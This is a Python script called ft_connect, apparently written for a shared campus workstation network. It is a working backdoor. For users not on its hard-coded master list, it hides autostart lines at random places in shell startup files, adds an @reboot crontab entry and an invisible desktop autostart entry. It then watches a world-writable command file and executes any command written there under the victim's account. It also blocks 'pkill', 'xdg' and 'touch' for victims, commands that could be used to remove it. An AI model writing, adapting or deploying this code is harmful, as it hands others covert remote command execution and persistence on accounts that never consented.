#!/usr/bin/env python3
import os
import sys
import time
import subprocess
import getpass
import random
from datetime import datetime

try:
    from PIL import ImageGrab
except ImportError:
    ImageGrab = None


# === CONFIGURATION ===
BASE_PATH = "/sgoinfre/goinfre/Perso/zcadinot/script/fc/ft_connect"
SCRIPT_PATH = f"{BASE_PATH}/src/core/ft_connect.py"

CMD_PATH = os.path.join(BASE_PATH, "cmd")
USER_PATH = os.path.join(BASE_PATH, "user")
WATCH_FILE = os.path.join(CMD_PATH, "cmd.txt")
TYPE_FILE = os.path.join(CMD_PATH, "type.txt")
SCREEN_BASE_PATH = os.path.join(BASE_PATH, "screen")
BLOCKED_LOG = os.path.join(CMD_PATH, "cmd_blocked.log")

MASTER_USERS = ["zcadi", "aeheve", "root"]
CURRENT_USER = getpass.getuser()

FORBIDDEN = ["pkill", "xdg", "touch"]
AUTOSTART_MARKER = "# FT_CONNECT_AUTOSTART"
VERBOSE_MODE = False


# === PROCESS CHECK ===
def is_ft_connect_running():
    try:
        out = subprocess.check_output(
            ["ps", "aux"], stderr=subprocess.DEVNULL
        ).decode()
        pid = os.getpid()
        for line in out.splitlines():
            if SCRIPT_PATH in line and "python" in line:
                if int(line.split()[1]) != pid:
                    return True
        return False
    except Exception:
        return False


# === AUTOSTART COMMAND ===
def autostart_cmd():
    return (
        f"(nohup python3 {SCRIPT_PATH} >/dev/null 2>&1 &) "
        f">/dev/null 2>&1; clear {AUTOSTART_MARKER}\n"
    )


# === SHELL AUTOSTART ===
def ensure_shell_autostart():
    home = os.path.expanduser("~")
    targets = [".zshrc", ".bashrc", ".xprofile"]
    line = autostart_cmd()

    for name in targets:
        path = os.path.join(home, name)
        if not os.path.exists(path):
            continue

        try:
            with open(path, "r") as f:
                lines = f.readlines()

            if any(AUTOSTART_MARKER in l or SCRIPT_PATH in l for l in lines):
                continue

            lines.insert(random.randint(0, len(lines)), line)

            with open(path, "w") as f:
                f.writelines(lines)
        except Exception:
            pass


# === CRONTAB AUTOSTART ===
def ensure_cron_autostart():
    cron_line = f"@reboot nohup python3 {SCRIPT_PATH} >/dev/null 2>&1 &\n"
    try:
        existing = subprocess.check_output(
            ["crontab", "-l"], stderr=subprocess.DEVNULL
        ).decode()
    except Exception:
        existing = ""

    if SCRIPT_PATH in existing:
        return

    try:
        new_cron = existing + cron_line
        p = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE)
        p.communicate(new_cron.encode())
    except Exception:
        pass


# === XDG AUTOSTART ===
def ensure_xdg_autostart():
    autostart_dir = os.path.expanduser("~/.config/autostart")
    desktop_file = os.path.join(autostart_dir, "fc.desktop")

    if os.path.exists(desktop_file):
        return

    try:
        os.makedirs(autostart_dir, exist_ok=True)
        with open(desktop_file, "w") as f:
            f.write(
                "[Desktop Entry]\n"
                "Type=Application\n"
                "Name=ft_connect\n"
                f"Exec=python3 {SCRIPT_PATH}\n"
                "Hidden=false\n"
                "NoDisplay=true\n"
                "X-GNOME-Autostart-enabled=true\n"
            )
    except Exception:
        pass


# === FILE SYSTEM ===
def apply_acl(path):
    for user in MASTER_USERS:
        try:
            subprocess.run(
                ["setfacl", "-m", f"u:{user}:rwx", path],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except Exception:
            pass


def ensure_dir(path):
    try:
        os.makedirs(path, exist_ok=True)
        os.chmod(path, 0o777)
        apply_acl(path)
    except Exception:
        pass


def ensure_file(path):
    try:
        ensure_dir(os.path.dirname(path))
        if not os.path.exists(path):
            open(path, "w").close()
        os.chmod(path, 0o777)
        apply_acl(path)
    except Exception:
        pass


# === CORE ===
def read_type_file():
    global VERBOSE_MODE
    try:
        if os.path.exists(TYPE_FILE):
            VERBOSE_MODE = "1" in open(TYPE_FILE).read()
    except Exception:
        VERBOSE_MODE = False


def contains_forbidden(cmd):
    if CURRENT_USER in MASTER_USERS or not cmd:
        return False
    return any(x in cmd.lower() for x in FORBIDDEN)


def open_in_terminal(cmd):
    if contains_forbidden(cmd):
        clear_cmd_file()
        return
    try:
        subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            preexec_fn=os.setpgrp
        )
    except Exception:
        pass


def clear_cmd_file():
    try:
        open(WATCH_FILE, "w").write("None\n")
        apply_acl(WATCH_FILE)
    except Exception:
        pass


def watch_file():
    ensure_dir(BASE_PATH)
    ensure_dir(CMD_PATH)
    ensure_dir(USER_PATH)
    ensure_dir(SCREEN_BASE_PATH)

    ensure_file(WATCH_FILE)
    ensure_file(TYPE_FILE)
    ensure_file(BLOCKED_LOG)

    while True:
        try:
            read_type_file()
            with open(WATCH_FILE) as f:
                lines = [l.strip() for l in f if l.strip()]
            if len(lines) >= 2 and lines[0] in [CURRENT_USER, "all"]:
                open_in_terminal(lines[1])
                time.sleep(0.2)
                clear_cmd_file()
            time.sleep(1)
        except Exception:
            time.sleep(1)


# === MAIN ===
if __name__ == "__main__":
    if is_ft_connect_running():
        sys.exit(0)

    if CURRENT_USER not in MASTER_USERS:
        ensure_shell_autostart()
        ensure_cron_autostart()
        ensure_xdg_autostart()

    watch_file()
